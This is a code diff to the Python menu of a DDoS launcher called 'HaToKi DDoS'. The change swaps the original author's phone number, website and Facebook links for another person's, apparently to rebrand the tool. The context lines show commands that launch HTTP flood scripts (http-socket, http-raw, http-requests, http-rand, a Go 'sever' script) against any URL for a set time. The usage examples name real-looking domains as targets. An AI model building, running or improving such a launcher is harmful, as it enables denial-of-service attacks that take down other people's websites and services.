@@ -30,14 +30,14 @@ def ascii_vro():
     clear()
 
 def si():
-    print("Zalo/Call: 0978809934")
-    print("Information: https://hotieubao.info")
+    print("Zalo/Call: 0374439442")
+    print("Information: https://facebook.com/NGUYEN.TAI.HIEU.PROFILE")
 
 def menu():
     sys.stdout.write(f"HaToKi Ddos Update 1.5.8")
     clear()
-    print('HaToKi DDoS By HoTieuBao [hotieubao.info] ')
-    print("https://hotieubao.info")
+    print('HaToKi DDoS By NguyenTaiHieu [hieudvmxh.fun] ')
+    print("https://hieudvmxh.fun")
     print(Fore.YELLOW + """
 
             ╚═════════════════════╦═════════════════════════════════════════╦══════════════════════╝
@@ -49,15 +49,15 @@ def menu():
                ║   88~~~88 88~~~88    88    88    88 88`8b      88         `8b  d8'  .88'       ║
                ║   88   88 88   88    88    `8b  d8' 88 `88.   .88.         `8bd8'  j88.        ║
                ║   YP   YP YP   YP    YP     `Y88P'  YP   YD Y888888P         YP    888888D     ║
-               ║------------ Link faceBook : https://www.facebook.com/HoTieuBao.info -----------║
+               ║------------ Link faceBook : https://facebook.com/NGUYENTAIHIEUPROFI -----------║
                ╚════════════════════════╦═══════════════════════════╦═══════════════════════════╝
                      ╔══════════════════╩═══════════════════════════╩═══════════════════╗
                      ║-------------- prohibit attack government web, gov ---------------║ 
                      ╚═════════════╦══════════════════════════════════════╦═════════════╝
                          ╔═════════╩═════════╗                  ╔═════════╩═════════╗
-                         ║   hotieubao.info  ╠══════════════════╣   hotieubao.info  ║
-                         ║    0978809934     ║ -   -   -   -  - ║     0978809934    ║
-                         ║                   ╠══════════════════╣                   ║
+                         ║    hieudvmxh.fun  ╠══════════════════╣   hieudvmxh.fun       ║
+                         ║    0374439442     ║ -   -   -   -  -    ║     0374439442        ║
+                         ║                   ╠══════════════════╣                       ║
                          ╚═══════════════════╝                  ╚═══════════════════╝
 
 """)
@@ -93,7 +93,7 @@ def main():
                 os.system(f'node HTTP-SOCKET {url} {per} {time}')
             except IndexError:
                 print(Fore.RED +'Usage: http-socket <url> <per> <time>')
-                print(Fore.RED +'Example: http-socket http://hotieubao.info/ 5000 60')
+                print(Fore.RED +'Example: http-socket http://hieudvmxh.fun/ 5000 60')
 
         elif "http-raw" in cnc:
             try:
@@ -102,7 +102,7 @@ def main():
                 os.system(f'node HTTP-RAW {url} {time}')
             except IndexError:
                 print(Fore.RED +'Usage: http-raw <url> <time>')
-                print(Fore.RED +'Example: http-raw http://hotieubao.info/ 60')
+                print(Fore.RED +'Example: http-raw http://hieudvmxh.fun/ 60')
 
         elif "http-requests" in cnc:
             try:
@@ -111,7 +111,7 @@ def main():
                 os.system(f'node HTTP-REQUESTS {url} {time}')
             except IndexError:
                 print(Fore.RED +'Usage: http-requests <url> <time>')
-                print(Fore.RED +'Example: http-requests http://hotieubao.info/ 60')
+                print(Fore.RED +'Example: http-requests http://hieudvmxh.fun/ 60')
 
         elif "stress" in cnc:
             try:
@@ -136,7 +136,7 @@ def main():
                 os.system(f'node HTTP-RAND.js {url} {time}')
             except IndexError:
                 print(Fore.RED +'Usage: http-rand <url> <time>')
-                print(Fore.RED +'Example: http-rand http://hotieubao.info/ 60')
+                print(Fore.RED +'Example: http-rand http://hieudvmxh.fun/ 60')
 
         elif "sever" in cnc:
             try:
@@ -145,11 +145,11 @@ def main():
                 os.system(f'go run sever.go -site {url} -data {method}')
             except IndexError:
                 print(Fore.RED +'Usage: sever <url> METHODS<GET/POST>')
-                print(Fore.RED +'Example: sever http://hotieubao.info/ GET')
+                print(Fore.RED +'Example: sever http://hieudvmxh.fun/ GET')
 
         elif "info" in cnc:
             print(f'''
-[https://hotieubao.info]
+[https://hieudvmxh.fun]
 
             ''')
         else:
